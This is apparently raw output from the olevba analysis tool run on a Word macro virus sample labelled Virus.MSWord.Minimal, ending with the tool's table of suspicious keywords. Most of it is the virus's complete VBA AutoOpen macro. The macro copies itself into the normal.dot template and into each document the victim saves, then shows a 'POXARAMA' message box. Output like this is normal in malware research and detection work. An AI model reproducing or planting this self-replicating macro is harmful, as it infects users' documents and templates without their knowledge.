olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.s-d569b6fcb0632f92db6cc155ae5d03960c0384fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.s-d569b6fcb0632f92db6cc155ae5d03960c0384fe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.s-d569b6fcb0632f92db6cc155ae5d03960c0384fe - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim N$
Dim Msg$
Rem aUToOpen Macro
Dim wiz As Object: Set wiz = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs wiz

On Error GoTo -1: On Error GoTo PoX
If wiz.Format = 0 Then
wiz.Format = 1
N$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "normal.dot:aUToOpen", WordBasic.[FileName$]() + ":aUToOpen", 4
WordBasic.FileSaveAs wiz
End If

WordBasic.MacroCopy WordBasic.[FileName$]() + ":aUToOpen", "normal.dot:aUToOpen", 4
Msg$ = Msg$ + " May a PoX be upon you Sam I am "
WordBasic.MsgBox Msg$, "               POXARAMA"
PoX:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

